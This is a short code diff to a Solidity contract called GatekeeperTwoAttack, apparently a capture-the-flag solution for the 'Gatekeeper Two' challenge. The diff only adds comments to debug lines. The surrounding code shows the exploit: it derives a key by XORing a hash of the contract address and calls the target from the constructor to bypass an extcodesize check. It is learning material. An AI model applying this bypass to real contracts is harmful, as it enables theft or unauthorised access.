@@ -17,10 +17,11 @@ contract GatekeeperTwoAttack {
       uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
       uint64 c = uint64(0) - 1;
 
-      emit Debug(toHexString(a));
-      emit Debug(toHexString(c));
-      emit Debug(toHexString(a ^ c));
-      emit Debug(toHexString(a ^ (a ^ c)));
+      emit Debug(toHexString(a)); // A
+      emit Debug(toHexString(c)); // C
+      emit Debug(toHexString(a ^ c)); // should be B
+      emit Debug(toHexString(a ^ (a ^ c))); // should be C
+
       // When contract is being created, code size (extcodesize) is 0.
       // This will pass the (x == 0) requirement from Gate 2
       victimContract.enter(bytes8(a ^ c)); // A ^ C = B
